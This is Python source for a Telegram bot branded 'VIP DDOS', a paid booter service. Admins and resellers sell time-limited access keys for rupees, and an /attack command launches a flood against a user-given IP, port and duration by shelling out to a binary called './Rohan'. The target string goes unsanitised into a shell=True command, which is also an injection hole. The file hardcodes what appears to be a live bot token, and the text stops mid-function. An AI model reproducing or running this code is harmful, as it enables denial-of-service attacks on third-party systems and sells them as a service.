import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import fcntl  # For file locking
import shutil  # For file backup
import re

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('7564493380:AAEjc8jXOqBZAwNNZU8sVyiOoFu8K6vY-cg')  # Replace with your bot token

# Admin user IDs
admin_id = {"1807014348", "6258297180", "6955279265"}  # Replace with your admin Telegram ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
BLOCK_ERROR_LOG = "block_error_log.txt"
KEY_FILE_BACKUP = "keys_backup.json"

# Per key cost for resellers
KEY_COST = {"1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
COOLDOWN_PERIOD = 60  # Default cooldown period in seconds

def escape_markdown_v2(text):
    """Escape special MarkdownV2 characters."""
    special_chars = r'_[]()~`>#*+-|=!.{}'
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open("cooldown.json", "w") as file:
        json.dump({"cooldown": seconds}, file)

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 60

def load_data():
    """Load all data from files."""
    global users, keys, authorized_users
    try:
        users = read_users()
        keys = read_keys()
        authorized_users = read_authorized_users()
        load_cooldown()
        print(f"Data loaded successfully. Keys: {list(keys.keys())}")
    except Exception as e:
        print(f"Error loading data: {str(e)}")
        keys = {}
        users = {}
        authorized_users = {}

def read_users():
    """Read users from users.json."""
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    """Save users to users.json."""
    try:
        with open(USER_FILE, "w") as file:
            json.dump(users, file)
    except Exception as e:
        print(f"Error saving users: {str(e)}")

def read_keys():
    """Read keys from keys.json with file locking."""
    try:
        with open(KEY_FILE, "r") as file:
            fcntl.flock(file.fileno(), fcntl.LOCK_SH)  # Shared lock for reading
            data = json.load(file)
            fcntl.flock(file.fileno(), fcntl.LOCK_UN)  # Unlock
            # Add generation time if not present
            for key, value in data.items():
                if "generated_time" not in value:
                    value["generated_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
                    value["generated_by"] = "Unknown"
            return data if isinstance(data, dict) else {}
    except FileNotFoundError:
        print(f"{KEY_FILE} not found, initializing empty keys.")
        return {}
    except json.JSONDecodeError:
        print(f"Error decoding {KEY_FILE}, initializing empty keys.")
        return {}
    except Exception as e:
        print(f"Error reading keys: {str(e)}")
        return {}

def save_keys():
    """Save keys to keys.json with file locking and backup."""
    try:
        # Create a backup of the current keys.json
        if os.path.exists(KEY_FILE):
            shutil.copy2(KEY_FILE, KEY_FILE_BACKUP)
        
        with open(KEY_FILE, "w") as file:
            fcntl.flock(file.fileno(), fcntl.LOCK_EX)  # Exclusive lock for writing
            json.dump(keys, file, indent=4)
            fcntl.flock(file.fileno(), fcntl.LOCK_UN)  # Unlock
        print(f"Keys saved successfully: {list(keys.keys())}")
        
        # Verify the write by reading back
        with open(KEY_FILE, "r") as file:
            fcntl.flock(file.fileno(), fcntl.LOCK_SH)
            data = json.load(file)
            fcntl.flock(file.fileno(), fcntl.LOCK_UN)
            if len(data) != len(keys):
                raise ValueError("Verification failed: Saved keys do not match in-memory keys")
    except Exception as e:
        print(f"Error saving keys: {str(e)}")
        # Restore from backup if save fails
        if os.path.exists(KEY_FILE_BACKUP):
            shutil.copy2(KEY_FILE_BACKUP, KEY_FILE)
            print(f"Restored keys from backup due to save error")

def read_authorized_users():
    """Read authorized users from authorized_users.json."""
    try:
        with open(AUTHORIZED_USERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_authorized_users():
    """Save authorized users to authorized_users.json."""
    try:
        with open(AUTHORIZED_USERS_FILE, "w") as file:
            json.dump(authorized_users, file)
    except Exception as e:
        print(f"Error saving authorized users: {str(e)}")

def parse_duration(duration_str):
    """Parse duration string (e.g., 1h, 1d, 1m, 1hours, 1days, 1months) and return hours, days, months."""
    duration_str = duration_str.lower()
    duration_str = duration_str.replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([hdm])", duration_str)
    if not match:
        return None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "h":
        return value, 0, 0
    elif unit == "d":
        return 0, value, 0
    elif unit == "m":
        return 0, 0, value
    return None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    """Add time to the current date and return the new datetime."""
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Load and save resellers
def load_resellers():
    """Load resellers from resellers.json."""
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    """Save resellers to resellers.json."""
    try:
        with open(RESELLERS_FILE, "w") as file:
            json.dump(resellers, file, indent=4)
    except Exception as e:
        print(f"Error saving resellers: {str(e)}")

resellers = load_resellers()

# Attack-related functions
def log_command(user_id, target, port, time):
    """Log attack command details."""
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    """Record command logs."""
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open("log.txt", "a") as file:
        log_entry += "\n"
        file.write(log_entry)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    """Execute an attack command."""
    try:
        packet_size = 1200
        if packet_size < 1 or packet_size > 65507:
            bot.send_message(chat_id, "Error: Packet size must be between 1 and 65507")
            return
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 512\nAttacker: @{escape_markdown_v2(username)}"
        bot.send_message(chat_id, response, parse_mode='MarkdownV2')
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, send_attack_finished_message, [chat_id]).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
    except Exception as e:
        bot.send_message(chat_id, f"Error executing attack: {str(e)}")

def send_attack_finished_message(chat_id):
    """Send message when attack is completed."""
    bot.send_message(chat_id, "Attack completed")

# Admin command to add reseller
@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    """Add a new reseller."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /addreseller <user_id> <balance>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "Invalid balance amount")
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} already exists")

# Command to generate keys (for admins and resellers)
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    """Generate a new key."""
    user_id = str(message.from_user.id)
    command = message.text.split()

    # Check user role and validate command syntax
    if user_id in admin_id or user_id in resellers:
        if len(command) != 3:
            bot.reply_to(message, "Usage: /genkey <duration> <key_name>\nExample: /genkey 1d rahul")
            return
        duration = command[1].lower()
        key_name = command[2]
        # Validate key_name
        if not re.match(r'^[a-zA-Z0-9-]+$', key_name):
            bot.reply_to(message, "Invalid key name. Use only letters, numbers, and hyphens.")
            return
    else:
        bot.reply_to(message, "Access Denied: Admin or reseller only command")
        return

    # Parse and validate duration
    hours, days, months = parse_duration(duration)
    if hours is None:
        bot.reply_to(message, "Invalid duration. Use formats like 1h, 1d, 1m, 1hours, 1days, 1months")
        return

    # Normalize duration for KEY_COST lookup
    cost_duration = duration
    if hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    if days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    if months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    # Generate custom key name
    custom_key = f"Rahul_sadiq-{key_name}"

    # Check if key name already exists
    if custom_key in keys:
        bot.reply_to(message, f"Key '{custom_key}' already exists. Please choose a different name.")
        return

    # Generate key
    device_limit = 1
    user_info = bot.get_chat(user_id)
    generated_by = user_info.username if user_info.username else f"UserID_{user_id}"
    keys[custom_key] = {
        "duration": duration,
        "device_limit": device_limit,
        "devices": [],
        "blocked": False,
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        "generated_by": generated_by
    }
    save_keys()
    # Escape special characters in generated_by
    escaped_generated_by = escape_markdown_v2(generated_by)
    response = (
        f"Key generated successfully\n"
        f"Key: `{custom_key}`\n"
        f"Duration: {duration}\n"
        f"Device Limit: {device_limit}\n"
        f"Generated by: @{escaped_generated_by}\n"
        f"Generated on: {keys[custom_key]['generated_time']}"
    )
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_resellers(resellers)
            response += f"\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
    
    # Check response length
    max_message_length = 4096
    if len(response) > max_message_length:
        bot.reply_to(message, "Response too long. Please contact the admin.")
        return
    
    print(f"Response string: {response}")  # Debug print
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in generate_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# Help command - Accessible to everyone
@bot.message_handler(commands=['help'])
def help_command(message):
    """Display help guide."""
    user_id = str(message.from_user.id)
    rahul_618 = escape_markdown_v2("Rahul_618")
    help_text = (
        f"*VIP DDOS HELP GUIDE*\n"
        f"*BOT CONTROLS:*\n"
        f"\\- /start \\- Start the bot\n"
        f"\\- /help \\- Show this guide\n"
        f"*POWER MANAGEMENT:*\n"
        f"\\- /attack <ip> <port> <time> \\- Launch an attack \\(admin and authorized users only\\)\n"
        f"\\- /setcooldown <seconds> \\- Set the attack cooldown period \\(admin only\\)\n"
        f"\\- /checkcooldown \\- Check the current cooldown period\n"
        f"\\- /addreseller <user_id> <balance> \\- Add a new reseller \\(admin only\\)\n"
        f"\\- /genkey <duration> <key_name> \\- Generate a key \\(admin and resellers only\\)\n"
        f"\\- /logs \\- View recent logs \\(admin only\\)\n"
        f"\\- /users \\- List authorized users \\(admin only\\)\n"
        f"\\- /add <user_id> \\- Add user ID for access without a key \\(admin only\\)\n"
        f"\\- /remove <user_id> \\- Remove a user \\(admin only\\)\n"
        f"\\- /resellers \\- View resellers\n"
        f"\\- /addbalance <reseller_id> <amount> \\- Add balance to a reseller \\(admin only\\)\n"
        f"\\- /removereseller <reseller_id> \\- Remove a reseller \\(admin only\\)\n"
        f"\\- /block <key_name> \\- Block a key \\(admin only\\)\n"
        f"\\- /redeem <key_name> \\- Redeem your key \\(e\\.g\\., `/redeem Rahul_sadiq-rahul`\\)\n"
        f"\\- /balance \\- Check your reseller balance \\(resellers only\\)\n"
        f"\\- /myinfo \\- View your user information\n"
        f"\\- /listkeys \\- List all keys with details \\(admin only\\)\n"
        f"*EXAMPLES:*\n"
        f"\\- /genkey 1d rahul \\- Generate a 1\\-day key \\(eg Key: `Rahul_sadiq-rahul`\\)\n"
        f"\\- /attack 192\\.168\\.1\\.1 80 120 \\- Launch an attack \\(if authorized\\)\n"
        f"\\- /setcooldown 120 \\- Set cooldown to 120 seconds \\(admin only\\)\n"
        f"\\- /checkcooldown \\- View current cooldown\n"
        f"\\- /redeem Rahul_sadiq-rahul \\- Redeem your key\n"
        f"\\- /listkeys \\- View all keys \\(admin only\\)\n"
        f"Buy key from @{rahul_618}\n"
        f"Any problem contact @{rahul_618}"
    )
    try:
        bot.reply_to(message, help_text, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in help_command at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {help_text}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# Reseller balance check
@bot.message_handler(commands=['balance'])
def check_balance(message):
    """Check reseller balance."""
    user_id = str(message.from_user.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance} Rs"
    else:
        response = "Access Denied: Reseller only command"
    bot.reply_to(message, response)

# Redeem key command
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    """Redeem a key."""
    user_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /redeem <key_name>\nExample: /redeem Rahul_sadiq-rahul")
        return
    key = command[1].strip()
    rahul_618 = escape_markdown_v2("Rahul_618")
    if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
        bot.reply_to(message, "Admin/Authorized User: No need to redeem a key.")
        return
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response = (
                    f"You already have an active key\\!\n"
                    f"Your access expires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                    f"Please wait until it expires to redeem a new key\\. "
                    f"To extend access, buy a new key for 50₹ after expiration and DM @{rahul_618}\\."
                )
                try:
                    bot.reply_to(message, response, parse_mode='MarkdownV2')
                except Exception as e:
                    with open("error_log.txt", "a") as log_file:
                        log_file.write(f"Error in redeem_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
                    bot.reply_to(message, "An error occurred. Please contact the admin.")
                return
            else:
                del users[user_id]
                save_users()
        except ValueError:
            response = f"Error: Invalid expiration date format in your user data\\. Contact the admin: @{rahul_618}"
            try:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error in redeem_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
                bot.reply_to(message, "An error occurred. Please contact the admin.")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            response = f"This key has been blocked\\. Contact the admin: @{rahul_618}"
            try:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error in redeem_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
                bot.reply_to(message, "An error occurred. Please contact the admin.")
            return
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            bot.reply_to(message, "Key has reached its device limit.")
            return
        if user_id in keys[key]["devices"]:
            bot.reply_to(message, "You have already redeemed this key.")
            return
        duration = keys[key]["duration"]
        hours, days, months = parse_duration(duration)
        if hours is None:
            response = f"Invalid duration in key\\. Contact the admin: @{rahul_618}"
            try:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error in redeem_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
                bot.reply_to(message, "An error occurred. Please contact the admin.")
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_users()
        save_keys()
        bot.reply_to(message, f"Key redeemed successfully!\nYour access expires on: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
    else:
        response = (
            f"Invalid or expired key\\! Buy a new key for 50₹\\. "
            f"Make payment and DM @{rahul_618}\\."
        )
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2')
        except Exception as e:
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"Error in redeem_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
            bot.reply_to(message, "An error occurred. Please contact the admin.")

# Block key command - Admin only
@bot.message_handler(commands=['block'])
def block_key(message):
    """Block a key."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /block <key_name>\nExample: /block Rahul_sadiq-rahul")
        return
    key_name = command[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        bot.reply_to(message, "Invalid key format. Key must start with 'Rahul_sadiq-'")
        return
    
    # Reload keys to ensure we have the latest data
    global keys
    keys = read_keys()
    
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker_username = escape_markdown_v2(keys[key_name].get("blocked_by_username", "Unknown"))
            block_time = keys[key_name].get("blocked_time", "Unknown")
            response = (
                f"Key '{key_name}' is already blocked\\.\n"
                f"Blocked by: @{blocker_username}\n"
                f"Blocked on: {block_time}"
            )
            try:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error in block_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
                bot.reply_to(message, "An error occurred. Please contact the admin.")
            return
        user_info = bot.get_chat(user_id)
        blocker_username = user_info.username if user_info.username else f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker_username
        keys[key_name]["blocked_time"] = block_time
        save_keys()
        escaped_blocker_username = escape_markdown_v2(blocker_username)
        response = (
            f"Key '{key_name}' has been blocked successfully\\.\n"
            f"Blocked by: @{escaped_blocker_username}\n"
            f"Blocked on: {block_time}"
        )
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2')
        except Exception as e:
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"Error in block_key at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
            bot.reply_to(message, "An error occurred. Please contact the admin.")
    else:
        bot.reply_to(message, f"Key '{key_name}' not found in keys.json.")
        with open(BLOCK_ERROR_LOG, "a") as log_file:
            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} by UserID: {user_id} failed. Available keys: {list(keys.keys())}\n")

# Add user with manual access - Admin only
@bot.message_handler(commands=['add'])
def add_user(message):
    """Add a user with manual access."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /add <user_id>\nExample: /add 1807014348")
        return
    target_user_id = command[1]
    if target_user_id in authorized_users:
        bot.reply_to(message, f"User {target_user_id} is already authorized.")
        return
    expiration_time = add_time_to_current_date(months=1)
    authorized_users[target_user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_authorized_users()
    bot.reply_to(message, f"User {target_user_id} added with access until {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")

# Show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    """Show recent logs."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "No data found")

# Start command - Accessible to everyone
@bot.message_handler(commands=['start'])
def start_command(message):
    """Start the bot."""
    user_id = str(message.from_user.id)
    rahul_618 = escape_markdown_v2("Rahul_618")
    has_active_access = False
    if user_id in admin_id or user_id in users or user_id in authorized_users:
        if user_id in users:
            try:
                expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) < expiration_date:
                    has_active_access = True
            except ValueError:
                has_active_access = False
        elif user_id in authorized_users:
            try:
                expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) < expiration_date:
                    has_active_access = True
            except ValueError:
                has_active_access = False
        else:
            has_active_access = True  # Admins always have access
    response = (
        f"WELCOME TO VIP DDOS\n"
        f"Use /help to see all available commands"
    )
    if not has_active_access:
        response += (
            f"\nTo use attack features, use /redeem <key_name> \\(e\\.g\\., /redeem Rahul_sadiq-rahul\\) "
            f"or buy access for 50₹\\. Make payment and DM @{rahul_618} to get a key or ask an admin to authorize you\\."
        )
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in start_command at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# Attack command with admin bypass
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    """Handle attack command."""
    user_id = str(message.from_user.id)
    rahul_618 = escape_markdown_v2("Rahul_618")
    has_access = False
    if user_id in admin_id:
        has_access = True
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    if not has_access:
        response = (
            f"Unauthorized Access\\! Use /redeem <key_name> \\(e\\.g\\., /redeem Rahul_sadiq-rahul\\) "
            f"or buy access for 50₹\\. Make payment and DM @{rahul_618} to get a key or ask an admin to authorize you\\."
        )
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2')
        except Exception as e:
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"Error in handle_attack at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
            bot.reply_to(message, "An error occurred. Please contact the admin.")
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            bot.reply_to(message, f"Cooldown in effect, wait {int(remaining_cooldown)} seconds")
            return
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
        return
    target = command[1]
    try:
        port = int(command[2])
        time = int(command[3])
        if time > 900:
            bot.reply_to(message, "Error: use less than 900 seconds")
            return
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        username = message.from_user.username or "UserID_" + str(user_id)
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    except ValueError:
        bot.reply_to(message, "Invalid port or time format.")

# Set cooldown command
@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    """Set attack cooldown period."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(command[1])
        if seconds < 0:
            bot.reply_to(message, "Cooldown must be non-negative")
            return
        set_cooldown(seconds)
        bot.reply_to(message, f"Cooldown set to {seconds} seconds")
    except ValueError:
        bot.reply_to(message, "Invalid cooldown value. Please provide a number.")

# Check cooldown command
@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    """Check current cooldown period."""
    bot.reply_to(message, f"Current cooldown period: {COOLDOWN_PERIOD} seconds")

# My info
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    """Display user information."""
    user_id = str(message.from_user.id)
    username = message.from_user.username or "No username"
    my_key = "No key"
    role = "Guest"
    expiration = "No expiration"
    rahul_618 = escape_markdown_v2("Rahul_618")
    
    if user_id in admin_id:
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
    elif user_id in users:
        role = "User"
        try:
            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
            my_key = [k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]][0] if any(user_id in v["devices"] for v in keys.values()) else "No key"
        except (ValueError, IndexError):
            expiration = "Invalid expiration"
    elif user_id in authorized_users:
        role = "Authorized User"
        try:
            expiration = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
        except ValueError:
            expiration = "Invalid expiration"

    response = (
        f"USER INFORMATION\n"
        f"Username: @{escape_markdown_v2(username)}\n"
        f"UserID: {user_id}\n"
        f"My key: {my_key}\n"
        f"Role: {role}\n"
        f"Expiration: {expiration}\n"
    )
    if role == "Reseller":
        response += f"Balance: {balance} Rs\n"
    response += f"Buy key from @{rahul_618}\nAny problem contact @{rahul_618}"
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in my_info at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# List users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    """List authorized users."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Authorized Users\n"
    all_users = {**users, **authorized_users}
    if all_users:
        for user, expiration in all_users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += (
                f"User ID: {user}\n"
                f"Username: @{escape_markdown_v2(username)}\n"
                f"Expires On: {formatted_expiration}\n"
            )
    else:
        response = "No authorized users found\\."
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in list_authorized_users at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# Remove user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Remove a user."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"User {target_user_id} removed from key\\-based access\\."
    elif target_user_id in authorized_users:
        del authorized_users[target_user_id]
        save_authorized_users()
        response = f"User {target_user_id} removed from authorized access\\."
    else:
        response = f"User {target_user_id} not found in authorized users\\."
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in remove_user at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# Show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    """Show authorized resellers."""
    response = "Authorized Resellers\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id).username else "Unknown"
            response += (
                f"Username: @{escape_markdown_v2(reseller_username)}\n"
                f"UserID: {reseller_id}\n"
                f"Balance: {balance} Rs\n"
            )
    else:
        response += "No reseller found\\."
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except Exception as e:
        with open("error_log.txt", "a") as log_file:
            log_file.write(f"Error in show_resellers at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
        bot.reply_to(message, "An error occurred. Please contact the admin.")

# Add balance
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    """Add balance to a reseller."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
        return
    reseller_id = command_parts[1]
    try:
        amount = float(command_parts[2])
        if reseller_id not in resellers:
            bot.reply_to(message, "Reseller ID not found")
            return
        resellers[reseller_id] += amount
        save_resellers(resellers)
        response = (
            f"Balance Successfully added\n"
            f"Balance: {amount} Rs\n"
            f"Reseller ID: {reseller_id}\n"
